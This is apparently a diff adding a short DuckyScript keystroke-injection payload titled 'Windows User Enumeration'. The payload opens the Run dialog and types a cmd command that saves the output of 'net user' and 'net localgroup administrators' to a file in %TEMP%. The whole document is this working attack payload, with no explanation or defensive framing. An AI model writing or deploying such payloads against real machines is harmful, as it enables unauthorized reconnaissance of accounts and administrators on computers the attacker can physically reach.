@@ -1,0 +1,6 @@
+REM Windows User Enumeration
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c "net user > %TEMP%\users.txt && net localgroup administrators >> %TEMP%\users.txt"
+ENTER
